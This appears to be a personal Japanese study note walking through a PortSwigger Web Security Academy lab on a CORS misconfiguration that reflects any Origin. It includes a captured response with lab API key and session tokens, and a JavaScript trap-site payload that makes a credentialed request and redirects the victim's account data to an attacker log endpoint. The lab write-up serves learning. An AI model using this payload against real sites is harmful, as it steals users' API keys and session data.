Date: 2025-09-17
Tags: 
Links: [[WSA]], [[CORS]]

***

1. `Access-Control-Allow-Credentials: true`でCORSをサポートしていることがわかる。
```http
HTTP/2 200 OK
Access-Control-Allow-Credentials: true 
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 189

{
  "username": "wiener",
  "email": "",
  "apikey": "MNIceXJrfKJAq27uKZtcHnT1bd5U491T",
  "sessions": [
    "rvMHs40j9E8GYbbCCuDFqk5JlOGZIueS",
    "IW37eh1uV8CRAfG8fsS7Oo5VVT2HRJJ9"
  ]
}
```


2. `Origin: https://example.com`を追加して送信してみる。
	`Access-Control-Allow-Origin: https://e.com` が追加される。
	オリジンをなんでも受け入れていることがわかる。

3. 被害者に罠サイトを送る。
```javascript
<script> 
	var req = new XMLHttpRequest(); 
	req.onload = reqListener;
	req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
	req.withCredentials = true;
	req.send();
	  
	 function reqListener() { 
		 location='/log?key='+this.responseText;
	 }; 
 </script>
```

4. 被害者に送ると、被害者がログインしていたとき`罠サイト/log?key=`にリダイレクトされ、ログに残る。

***
# References

https://portswigger.net/web-security/learning-paths/cors/cors-vulnerabilities-arising-from-cors-configuration-issues/cors/lab-basic-origin-reflection-attack#